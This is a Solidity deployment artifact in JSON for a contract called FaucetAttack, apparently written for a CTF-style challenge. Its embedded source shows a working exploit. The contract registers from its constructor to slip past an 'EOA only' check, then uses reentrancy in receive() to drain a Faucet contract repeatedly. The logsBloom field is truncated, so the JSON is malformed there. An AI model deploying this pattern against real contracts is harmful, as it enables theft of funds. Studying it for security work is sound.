{
  "address": "0xA45a38f4e30d9B9506c731847E222561849d0cb8",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "faucet_",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "faucet",
      "outputs": [
        {
          "internalType": "contract Faucet",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0x50874ebef7aba8ded555c24b3ab52b4dcd7a63439997873b4a682b0e528adbb9",
  "receipt": {
    "to": null,
    "from": "0x6EF1032E74B0371BAa3cA64878d8984eFd1B7453",
    "contractAddress": "0xA45a38f4e30d9B9506c731847E222561849d0cb8",
    "transactionIndex": 3,
    "gasUsed": "371623",
    "logsBloom": "0x
    "blockHash": "0x5ec03713d6d9b641176d5490cf7b9327ee9cb3fd225b833258f3b4844952b0df",
    "transactionHash": "0x50874ebef7aba8ded555c24b3ab52b4dcd7a63439997873b4a682b0e528adbb9",
    "logs": [
      {
        "transactionIndex": 3,
        "blockNumber": 7505687,
        "transactionHash": "0x50874ebef7aba8ded555c24b3ab52b4dcd7a63439997873b4a682b0e528adbb9",
        "address": "0xA45a38f4e30d9B9506c731847E222561849d0cb8",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x0000000000000000000000006ef1032e74b0371baa3ca64878d8984efd1b7453"
        ],
        "data": "0x",
        "logIndex": 1,
        "blockHash": "0x5ec03713d6d9b641176d5490cf7b9327ee9cb3fd225b833258f3b4844952b0df"
      }
    ],
    "blockNumber": 7505687,
    "cumulativeGasUsed": "632202",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x9db6A88A8333530453d0b30B60DAd09DcC50a807"
  ],
  "numDeployments": 1,
  "solcInputHash": "329df6eea040942ab228bd750f849e01",
  "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"faucet_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"faucet\",\"outputs\":[{\"internalType\":\"contract Faucet\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/FaucetAttack.sol\":\"FaucetAttack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xa94b34880e3c1b0b931662cb1c09e5dfa6662f31cba80e07c5ee71cd135c9673\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"contracts/Faucet.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Faucet {\\n\\n    mapping(address => uint256) public users;\\n    mapping(address => bool) public paidUsers;\\n\\n    constructor () payable {}\\n\\n    function register(address user) external {\\n        require(!isContract(user), \\\"EOA only\\\");\\n        require(!paidUsers[user], \\\"Already paid\\\");\\n        users[user] = block.number;\\n    }\\n\\n    function withdraw() external payable {\\n        require(isContract(msg.sender), \\\"Contract only\\\");\\n        require(address(this).balance >= 0.001 ether, \\\"Faucet empty\\\");\\n        require(users[msg.sender] > 0, \\\"User not registered\\\");\\n        require(users[msg.sender] < block.number, \\\"Smells fishy\\\");\\n        (bool sent, ) = payable(msg.sender).call{value: 0.001 ether}(\\\"\\\");\\n        require(sent, \\\"Failed to send\\\");\\n        users[msg.sender] = 0;\\n        paidUsers[msg.sender] = true;\\n    }\\n\\n    function isContract(address _addr) private view returns (bool) {\\n        uint32 size;\\n        assembly {\\n            size := extcodesize(_addr)\\n        }\\n        return (size > 0);\\n    }\\n}\",\"keccak256\":\"0x06b110c19a165373472d9edde95976147302bfcd37679655a9f8b553bb9df22d\",\"license\":\"MIT\"},\"contracts/FaucetAttack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport '@openzeppelin/contracts/access/Ownable.sol';\\nimport './Faucet.sol';\\n\\ncontract FaucetAttack is Ownable {\\n    Faucet public faucet;\\n    uint8 i;\\n\\n    constructor(address faucet_) {\\n        i = 1;\\n        faucet = Faucet(faucet_);\\n        faucet.register(address(this));\\n    }\\n\\n    receive() external payable {\\n        if (i != 10) {\\n            i += 1;\\n            faucet.withdraw();\\n        }\\n    }\\n\\n    function withdraw() external onlyOwner {\\n        payable(owner()).transfer(address(this).balance);\\n    }\\n\\n    function hack() external onlyOwner {\\n        faucet.withdraw();\\n    }\\n}\",\"keccak256\":\"0x905cde7092650266ae7701a597f94f76e207f7b70b82980ced80375a5d847869\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161059d38038061059d83398101604081905261002f91610108565b610038336100b8565b600180546001600160a01b038381166001600160a81b031990921691909117600160a01b1791829055604051632210724360e11b8152306004820152911690634420e48690602401600060405180830381600087803b15801561009a57600080fd5b505af11580156100ae573d6000803e3d6000fd5b5050505050610138565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561011a57600080fd5b81516001600160a01b038116811461013157600080fd5b9392505050565b610456806101476000396000f3fe6080604052600436106100595760003560e01c80633ccfd60b146101185780634de260a21461012d578063715018a6146101425780638da5cb5b14610157578063de5f72fd1461018d578063f2fde38b146101ad57600080fd5b3661011357600154600160a01b900460ff16600a1461011157600180548190601490610090908390600160a01b900460ff166103bd565b92506101000a81548160ff021916908360ff160217905550600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012457600080fd5b506101116101cd565b34801561013957600080fd5b50610111610212565b34801561014e57600080fd5b50610111610284565b34801561016357600080fd5b506000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b34801561019957600080fd5b50600154610171906001600160a01b031681565b3480156101b957600080fd5b506101116101c83660046103f0565b610298565b6101d5610313565b600080546040516001600160a01b03909116914780156108fc02929091818181858888f1935050505015801561020f573d6000803e3d6000fd5b50565b61021a610313565b600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026a57600080fd5b505af115801561027e573d6000803e3d6000fd5b50505050565b61028c610313565b610296600061036d565b565b6102a0610313565b6001600160a01b03811661030a5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084015b60405180910390fd5b61020f8161036d565b6000546001600160a01b031633146102965760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610301565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b600060ff821660ff84168060ff038211156103e857634e487b7160e01b600052601160045260246000fd5b019392505050565b60006020828403121561040257600080fd5b81356001600160a01b038116811461041957600080fd5b939250505056fea264697066735822122073fde466185c3bb16eb75648e4b2a03b5795ff561bed9a9c1f65d70d0557eae364736f6c634300080a0033",
  "deployedBytecode": "0x6080604052600436106100595760003560e01c80633ccfd60b146101185780634de260a21461012d578063715018a6146101425780638da5cb5b14610157578063de5f72fd1461018d578063f2fde38b146101ad57600080fd5b3661011357600154600160a01b900460ff16600a1461011157600180548190601490610090908390600160a01b900460ff166103bd565b92506101000a81548160ff021916908360ff160217905550600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012457600080fd5b506101116101cd565b34801561013957600080fd5b50610111610212565b34801561014e57600080fd5b50610111610284565b34801561016357600080fd5b506000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b34801561019957600080fd5b50600154610171906001600160a01b031681565b3480156101b957600080fd5b506101116101c83660046103f0565b610298565b6101d5610313565b600080546040516001600160a01b03909116914780156108fc02929091818181858888f1935050505015801561020f573d6000803e3d6000fd5b50565b61021a610313565b600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026a57600080fd5b505af115801561027e573d6000803e3d6000fd5b50505050565b61028c610313565b610296600061036d565b565b6102a0610313565b6001600160a01b03811661030a5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084015b60405180910390fd5b61020f8161036d565b6000546001600160a01b031633146102965760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610301565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b600060ff821660ff84168060ff038211156103e857634e487b7160e01b600052601160045260246000fd5b019392505050565b60006020828403121561040257600080fd5b81356001600160a01b038116811461041957600080fd5b939250505056fea264697066735822122073fde466185c3bb16eb75648e4b2a03b5795ff561bed9a9c1f65d70d0557eae364736f6c634300080a0033",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 7,
        "contract": "contracts/FaucetAttack.sol:FaucetAttack",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 594,
        "contract": "contracts/FaucetAttack.sol:FaucetAttack",
        "label": "faucet",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(Faucet)585"
      },
      {
        "astId": 596,
        "contract": "contracts/FaucetAttack.sol:FaucetAttack",
        "label": "i",
        "offset": 20,
        "slot": "1",
        "type": "t_uint8"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(Faucet)585": {
        "encoding": "inplace",
        "label": "contract Faucet",
        "numberOfBytes": "20"
      },
      "t_uint8": {
        "encoding": "inplace",
        "label": "uint8",
        "numberOfBytes": "1"
      }
    }
  }
}